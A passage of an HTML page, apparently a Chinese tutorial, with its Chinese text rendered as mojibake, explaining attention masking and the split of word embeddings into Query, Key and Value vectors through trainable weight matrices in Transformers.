mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span></li>
</ul>
<p>å¦‚ä½•å®ç°è¿™ç§å±è”½ï¼Ÿå¾ˆç®€å•ï¼Œæ²¡æœ‰ä½ æƒ³è±¡çš„é‚£ä¹ˆå¤æ‚ï¼Œä¿æŒä¹‹å‰æ‰€æœ‰çš„ç®—æ³•æ­¥éª¤ä¸å˜ï¼Œä½ æƒ³å±è”½è°ï¼Œå°±æŠŠè°çš„<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal">p</span></span></span></span></span>ç½®ä¸ºè´Ÿæ— ç©·ï¼Œè¿™æ ·å®ƒåœ¨ç»è¿‡softmaxåï¼Œå¯¹åº”çš„<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></span>è‡ªç„¶å°±å˜æˆ0äº†ã€‚</p>
<hr/>
<p>å»ºè®®ä½ å°†å‰é¢çš„è‡ªæ³¨æ„åŠ›è®¡ç®—è¿‡ç¨‹äº²æ‰‹æ¨å¯¼ä¸€éã€‚è¿™ç§â€œç¬¨åŠŸå¤«â€èƒ½å¸®ä½ å»ºç«‹èµ·æ‰å®çš„ç›´è§‰â€”â€”å½“ä½ äº²æ‰‹ç”¨æ•°å­—æ¼”ç®—è¿‡æ³¨æ„åŠ›å¦‚ä½•æµåŠ¨åï¼Œå¯¹åç»­æŠ½è±¡æ¦‚å¿µçš„ç†è§£ä¼šæ¸…æ™°å¾—å¤šã€‚å¦‚æœä½ å·²ç»å®Œå…¨æŒæ¡äº†ä¸Šä¸€éƒ¨åˆ†ï¼Œé‚£ä¹ˆæ­å–œä½ ï¼Œä½ å·²ç»éå¸¸æ¥è¿‘Transformerçš„æ ¸å¿ƒäº†ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬æ›´è¿›ä¸€æ­¥ã€‚</p>
<p>è¿˜æ˜¯ä¸Šé¢çš„ä¾‹å­ï¼Œè®©æˆ‘ä»¬ä»”ç»†è§‚å¯Ÿè¿™ä¸ªæµç¨‹å›¾ã€‚ä½ ä¼šå‘ç°ï¼ŒåŒä¸€ä¸ªè¯åµŒå…¥å‘é‡éœ€è¦åŒæ—¶æ‰¿æ‹…ä¸‰ç§ä¸åŒçš„è§’è‰²ï¼š
ç¬¬ä¸€ï¼Œä½œä¸º<strong>æŸ¥è¯¢è€…</strong>ï¼ˆè“è‰²éƒ¨åˆ†ï¼‰ï¼Œå®ƒè¦ä¸»åŠ¨å»â€œè¯¢é—®â€è‡ªå·±ä¸å…¶ä»–å‘é‡çš„å…³ç³»ï¼›
ç¬¬äºŒï¼Œä½œä¸º<strong>è¢«æŸ¥è¯¢è€…</strong>ï¼ˆæ©™è‰²éƒ¨åˆ†ï¼‰ï¼Œå®ƒè¢«åŠ¨åœ°æ¥å—å…¶ä»–å‘é‡çš„â€œè¯¢é—®â€ï¼Œå¹¶æä¾›æ¯”è¾ƒçš„ä¾æ®ï¼›
ç¬¬ä¸‰ï¼Œä½œä¸º<strong>è¾“å‡ºå†…å®¹</strong>ï¼ˆç´«è‰²éƒ¨åˆ†ï¼‰ï¼Œå®ƒæœ€ç»ˆè¦å‚ä¸åŠ æƒæ±‚å’Œï¼Œæ„æˆæ–°è¡¨ç¤ºçš„ä¸€éƒ¨åˆ†ã€‚</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/164707cfe9f145eca60699aa6a290280~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=UEHAbc1Ve3ihLSmKD%2BSXegmN3Ec%3D" alt="c7.jpg" width="100%" loading="lazy"/></p>
<p>è®©ä¸€ä¸ªå‘é‡åŒæ—¶å®Œæˆè¿™ä¸‰é¡¹ä»»åŠ¡ï¼Œå°±åƒè®©ä¸€ä½æ¼”å‘˜åœ¨åŒä¸€å¹•æˆä¸­åˆ†é¥°ä¸‰ä¸ªè§’è‰²â€”â€”è™½ç„¶å¯èƒ½åšåˆ°ï¼Œå´éš¾å…é¡¾æ­¤å¤±å½¼ã€è¡¨è¾¾å—é™ã€‚åœ¨è®¡ç®—æ„ä¹‰ä¸Šï¼Œè¿™ç§â€œèº«å…¼æ•°èŒâ€ä¼šå¯¼è‡´å‘é‡ç»´åº¦è¢«è¿«æ‰¿è½½å¤šç§ç›¸äº’å†²çªçš„è¯­ä¹‰ä¿¡æ¯ï¼Œä»è€Œé™ä½æ¨¡å‹çš„è¡¨è¾¾æ•ˆç‡ä¸çµæ´»æ€§ã€‚</p>
<p>äºæ˜¯å¾ˆè‡ªç„¶åœ°ï¼Œæˆ‘ä»¬æƒ³åˆ°ä¸€ä¸ªæ”¹è¿›æ–¹æ¡ˆï¼š<strong>å°†åŸæ¥å•ä¸€çš„å‘é‡æ‹†åˆ†æˆä¸‰ä¸ªç‹¬ç«‹çš„å‘é‡ï¼Œè®©å®ƒä»¬å„å¸å…¶èŒ</strong>ã€‚å¦‚ä½•æ‹†åˆ†å‘¢ï¼Ÿæˆ‘ä»¬å¼•å…¥ä¸‰ä¸ªå¯è®­ç»ƒçš„æƒé‡çŸ©é˜µ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>W</mi><mi>q</mi></msub></mrow><annotation encoding="application/x-tex">W_q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>ã€<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>W</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">W_k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> ä¸ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>W</mi><mi>v</mi></msub></mrow><annotation encoding="application/x-tex">W_v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>ï¼Œåˆ†åˆ«ç”¨äºç”Ÿæˆ<strong>æŸ¥è¯¢å‘é‡ï¼ˆQueryï¼‰ã€é”®å‘é‡ï¼ˆKeyï¼‰ä¸å€¼å‘é‡ï¼ˆValueï¼‰</strong>ï¼š</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msubsup><mi>x</mi><mi>i</mi><mi>k</mi></msubsup><mo>=</mo><msub><mi>x</mi><mi>i</mi></msub><mo>â‹…</mo><msub><mi>W</mi><mi>k</mi></msub><mspace linebreak="newline"/><msubsup><mi>x</mi><mi>i</mi><mi>q</mi></msubsup><mo>=</mo><msub><mi>x</mi><mi>i</mi></msub><mo>â‹…</mo><msub><mi>W</mi><mi>q</mi></msub><mspace linebreak="newline"/><msubsup><mi>x</mi><mi>i</mi><mi>v</mi></msubsup><mo>=</mo><msub><mi>x</mi><mi>i</mi></msub><mo>â‹…</mo><msub><mi>W</mi><mi>v</mi></msub></mrow><annotation encoding="application/x-tex">x_{i}^{k} = x_{i} \cdot W_{k}
\\ x_{i}^{q} = x_{i} \cdot W_{q}
\\ x_{i}^{v} = x_{i} \cdot W_{v}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1461em;vertical-align:-0.247em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8991em;"><span style="top:-2.453em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.5945em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span><span class="mspace newline"/><span class="base"><span class="strut" style="height:1.0592em;vertical-align:-0.2769em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7823em;"><span style="top:-2.4231em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.1809em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2769em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.5945em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span><span class="mspace newline"/><span class="base"><span class="strut" style="height:0.9614em;vertical-align:-0.247em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-2.453em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.5945em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span></div>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/48888eb7d02f43c988913cdd9ed2d710~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=%2FZMojg4rM6jmQbazwcDxEWJcFtA%3D" alt="c8.jpg" width="100%" loading="lazy"/></p>
<p>è¿™æ ·ä¸€æ¥ï¼Œæ¯ä¸ªè¯å‘é‡é€šè¿‡ä¸‰ä¸ªä¸åŒçš„çº¿æ€§å˜æ¢ï¼Œæ¼”åŒ–å‡ºä¸‰ä¸ªåˆ†å·¥æ˜ç¡®çš„â€œåŒ–èº«â€ï¼š</p>
<ul>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>x</mi><mi>i</mi><mi>q</mi></msubsup></mrow><annotation encoding="application/x-tex">x_i^q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0592em;vertical-align:-0.2769em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7823em;"><span style="top:-2.4231em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.1809em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2769em;"><span/></span></span></span></span></span></span></span></span></span> ä¸“æ³¨äºè¡¨è¾¾â€œæˆ‘æƒ³å…³æ³¨ä»€ä¹ˆâ€ï¼Œ</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>x</mi><mi>i</mi><mi>k</mi></msubsup></mrow><annotation encoding="application/x-tex">x_i^k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1078em;vertical-align:-0.2587em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2587em;"><span/></span></span></span></span></span></span></span></span></span> ä¸“æ³¨äºè¡¨è¾¾â€œæˆ‘èƒ½æä¾›ä»€ä¹ˆç‰¹å¾ç”¨äºè¢«åŒ¹é…â€ï¼Œ</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>x</mi><mi>i</mi><mi>v</mi></msubsup></mrow><annotation encoding="application/x-tex">x_i^v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9231em;vertical-align:-0.2587em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2587em;"><span/></span></span></span></span></span></span></span></span></span> åˆ™çº¯ç²¹æ‰¿è½½â€œæˆ‘æœ¬èº«çš„å®é™…å†…å®¹â€ã€‚</li>
</ul>
<p>åç»­çš„æ³¨æ„åŠ›è®¡ç®—æµç¨‹ä¸ä¹‹å‰å®Œå…¨ä¸€è‡´ï¼Œåªæ˜¯å°†åŸå…ˆçš„ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">x_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> æ›¿æ¢ä¸ºå¯¹åº”çš„ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi><mo separator="true">,</mo><mi>k</mi><mo separator="true">,</mo><mi>v</mi></mrow><annotation encoding="application/x-tex">q, k, v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span></span>ï¼š</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/89bab2de19204c1bb276eabda0a23c9d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=G5IPUzBek5b120E9Dsadwbc79JA%3D" alt="c9.jpg" width="100%" loading="lazy"/></p>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>W</mi><mi>q</mi></msub><mo separator="true">,</mo><msub><mi>W</mi><mi>k</mi></msub><mo separator="true">,</mo><msub><mi>W</mi><mi>v</mi></msub></mrow><annotation encoding="application/x-tex">W_q, W_k, W_v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> ä½œä¸ºå¯è®­ç»ƒçš„å‚æ•°ï¼Œä½¿å¾—æ¨¡å‹èƒ½å¤Ÿé€šè¿‡æ•°æ®è‡ªåŠ¨å­¦ä¹ åˆ°<strong>æœ€é€‚åˆå½“å‰ä»»åŠ¡çš„æ³¨æ„åŠ›æ¨¡å¼</strong>ã€‚ç›¸æ¯”ä¹‹å‰å›ºå®šä½¿ç”¨åŸå§‹å‘é‡è¿›è¡Œç‚¹ç§¯çš„â€œç¡¬ç¼–ç â€æ–¹å¼ï¼Œè¿™ç§å¯å­¦ä¹ çš„æ‹†åˆ†æœºåˆ¶æå¤§å¢å¼ºäº†æ¨¡å‹çš„è¡¨è¾¾èƒ½åŠ›ã€‚</p>
<p>ä»è¯­ä¹‰åˆ†å·¥çš„è§’åº¦æ¥çœ‹ï¼Œè¿™ç§è®¾è®¡èµ‹äºˆæ¨¡å‹æ›´ç»†è…»çš„æ³¨æ„åŠ›è°ƒæ§èƒ½åŠ›ï¼ŒQKVæ ¹æ®è‡ªå·±ä¸åŒçš„èŒè´£ï¼Œè¡¨è¾¾ä¸åŒçš„è¯­ä¹‰ä¿¡æ¯ï¼Œè¿™æ ·æ¨¡å‹è‡ªç„¶è€Œç„¶å°±ä¼šæœ‰æ›´å¼ºçš„è¡¨è¾¾èƒ½åŠ›ã€‚</p>
<ul>
<li><strong>Query</strong> ä½“ç°äº†ä¸€ç§â€œä¸»åŠ¨æ€§â€ï¼Œç›¸å½“äºåœ¨é—®ï¼šâ€œæˆ‘ç°åœ¨éœ€è¦ä»€ä¹ˆæ ·çš„ä¿¡æ¯â€</li>
<li><strong>Key</strong> ä½“ç°äº†ä¸€ç§â€œåº”ç­”æ€§â€ï¼Œç›¸å½“äºåœ¨å›ç­”ï¼šâ€œæˆ‘è¿™é‡Œæœ‰è¿™æ ·çš„ç‰¹å¾â€</li>
<li><strong>Value</strong> åˆ™æ˜¯çœŸæ­£è¢«ä¼ é€’çš„å®è´¨å†…å®¹ï¼ŒåŒ¹é…æˆåŠŸåè´¡çŒ®åˆ°è¾“å‡ºä¸­ã€‚</li>
</ul>
<p>å„ç¯èŠ‚ä¸“ä¸šåˆ†å·¥ï¼Œæ•´ä¸ªç³»ç»Ÿæ‰èƒ½é«˜æ•ˆè¿è½¬ã€çµæ´»é€‚åº”å¤æ‚ä»»åŠ¡ã€‚<strong>è¿™æ­£å°è¯äº†äºšå½“Â·æ–¯å¯†çš„é‚£å¥è¯ï¼šåˆ†å·¥æ˜¯æé«˜æ•ˆç‡çš„æºæ³‰ã€‚</strong> åœ¨æ³¨æ„åŠ›æœºåˆ¶ä¸­ï¼ŒQueryã€Keyã€Valueçš„æ˜ç¡®èŒè´£åˆ’åˆ†ä¸ä¸“ä¸šåŒ–ï¼Œä¾¿æ˜¯æ¨¡å‹æ™ºèƒ½å¾—ä»¥æ¶Œç°çš„æ•ˆç‡ä¹‹æºã€‚</p>
<hr/>
